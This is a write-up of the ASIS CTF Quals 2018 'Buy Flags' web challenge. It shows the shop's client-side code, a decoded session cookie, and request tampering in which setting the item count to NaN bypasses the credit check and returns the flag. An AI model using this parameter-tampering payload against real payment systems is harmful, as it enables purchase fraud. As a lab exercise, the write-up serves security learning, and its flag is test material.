# ctf-asis-quals-2018
ASIS CTF QUALS 2018: Buy Flags

polarized
Category: WEB
Description: 
Here is an online shop that sells flags :) but we don’t have enough money! Can you buy the flag?




Checking the source code:
We see that its just a check for coupon,flags and and card . We also are able to see /pay .
$(document).ready(function() {
        $('#pay').click(function() {
          var coupon = btoa($('#coupon').val());
          var flags = ['fake1', 'fake2', 'asis'];
          var card = [];
          for (var i in flags) {
            if ($('#' + flags[i]).is(":checked")) {
              card.push({name:flags[i], count:1});
            }
          }
          $.ajax({
            type: 'POST',
            url :'/pay', 
            data: JSON.stringify({card: card, coupon: coupon}),
            contentType: 'application/json',
            success: function(result) {
              alert(result.result);
            }
          })
        });
 
 

Intercepting in BURP and examining session cookie. We find session cookie has something interesting half of session cookie value remains same in repeater. Now examining cookie for relevant info:
session=eyJjb3Vwb25zIjpbIiJdLCJjcmVkaXQiOjB9.DclIIg.gHOCuPsZQBGXb5Mo-LjjuilER7Y 

We base64 decode the session cookie and see output. Part of output is readable with fields coupon[] and card[] appended with random  sequence part which changes. This represented the static part of cookie was just coupon and card field. Attempts of figure out other part are in vain. 

So taking into account another vector. We can see from source code snippet. There is field count. Trying with  abuse count parameter.
{"card":[{"name":"asis","count":1}],"coupon":"YWJjZA=="}

 
We get response as:  your credit not enought.
{"result": "your credit not enough"}
 

We change value of count to -1. The server response is:
{"result":"item count must be greater than zero"}


We try with count 4 but get response: your credit not enough 

Finally changing the count to NaN as NaN cannot be true in comparions:
"card":[{"name":"asis","count":NaN}],"coupon":"YWJjZA=="}
 
We get pay success with flag in response:
{"data":"ASIS{th1@n_3xpens1ve_Fl@G}\n","flag":"asis"}
